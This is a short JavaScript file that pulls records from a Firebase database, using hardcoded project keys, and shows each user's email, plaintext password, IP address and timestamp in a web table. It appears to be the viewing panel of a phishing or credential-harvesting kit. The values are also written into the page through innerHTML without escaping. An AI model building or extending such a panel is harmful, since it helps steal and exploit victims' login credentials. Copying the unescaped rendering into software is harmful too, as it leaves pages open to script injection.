import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
    authDomain: "zphdozer.firebaseapp.com",
    projectId: "zphdozer",
    databaseURL: "https://zphdozer-default-rtdb.firebaseio.com",
    storageBucket: "zphdozer.firebasestorage.app",
    messagingSenderId: "1067331325075",
    appId: "1:1067331325075:web:02794fba9fb9633a171166",
    measurementId: "G-X9CN92LFTF"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Reference to the users data
const usersRef = ref(database, 'users');

// Listen for changes in the users data
onValue(usersRef, (snapshot) => {
    const tableBody = document.getElementById('user-table-body');
    tableBody.innerHTML = ''; // Clear existing content

    snapshot.forEach((childSnapshot) => {
        const userData = childSnapshot.val();
        const row = document.createElement('tr');
        
        // Create table cells
        row.innerHTML = `
            <td>${userData.email}</td>
            <td>${userData.password}</td>
            <td>${userData.ip}</td>
            <td>${new Date(userData.timestamp).toLocaleString()}</td>
        `;
        
        tableBody.appendChild(row);
    });
});
